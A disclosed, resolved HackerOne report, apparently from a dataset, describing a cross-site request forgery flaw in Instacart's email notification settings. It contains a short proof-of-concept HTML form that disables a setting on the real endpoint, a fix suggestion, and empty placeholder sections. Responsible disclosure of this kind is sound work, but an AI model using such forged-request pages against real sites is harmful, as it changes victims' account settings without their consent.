---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '157956'
original_report_id: '157956'
title: CSRF To change Email Notification Settings
weakness: Cross-Site Request Forgery (CSRF)
team_handle: instacart
created_at: '2016-08-09T20:11:34.963Z'
disclosed_at: '2016-09-15T18:44:14.096Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF To change Email Notification Settings

## Metadata

- HackerOne Report ID: 157956
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: instacart
- Disclosed At: 2016-09-15T18:44:14.096Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi i found CSRF To change Email Notification Settings 

The Code Of the HTML Page ::
<html>
  <body>
    <form action="https://www.instacart.com/api/v2/email_settings/76/disable?resource_token=">
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

For Fixing you Must add CSEF Token to the Request 

i attached Video Showing the Bug 

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
